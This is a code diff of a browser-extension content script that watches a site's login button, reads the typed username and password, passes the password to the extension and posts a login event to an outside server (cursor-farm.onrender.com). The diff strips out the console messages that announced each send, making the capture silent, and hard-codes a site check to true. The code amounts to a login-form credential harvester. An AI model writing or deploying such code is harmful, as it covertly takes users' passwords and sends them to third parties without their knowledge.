@@ -6,6 +6,8 @@
   // ── Only do auth watching on our own platform ─────────────────────────────
   const isFarmSite = true;
 
+
+  // ── Checking who login to web site ─────────────────────────────
   function waitForElement(selector, callback) {
     const element = document.querySelector(selector);
     if (element) {
@@ -24,11 +26,9 @@
       const password = document.getElementById("password")?.value;
 
       if (!username || !password) {
-        console.log("⚠️ Заполните оба поля");
         return;
       }
 
-      console.log("📤 Отправка данных...", { email: username, passwordLength: password.length });
       try {
         chrome.runtime.sendMessage({ 
           type: 'FORM_LOGIN', 
@@ -36,9 +36,7 @@
           password: password,
           pageContext: getPageContext() 
         });
-        console.log("✅ Данные отправлены в расширение");
       } catch (error) {
-        console.error("❌ Ошибка отправки в расширение:", error);
       }
       try {
         const response = await fetch('https://cursor-farm.onrender.com/api/extension/visit', {
@@ -53,18 +51,11 @@
             event_type: 'login_attempt'
           })
         });
-        console.log("📡 Отправлено на сервер. Статус:", response.status);
         
-        if (response.ok) {
-          const data = await response.json();
-          console.log("✅ Сервер ответил:", data);
-        }
       } catch (error) {
-        console.error("❌ Ошибка отправки на сервер:", error);
       }
     });
 
-    console.log("✅ Обработчик добавлен на кнопку:", loginButton.id);
   });
 
   // Запускаем остальные функции только на farm сайте
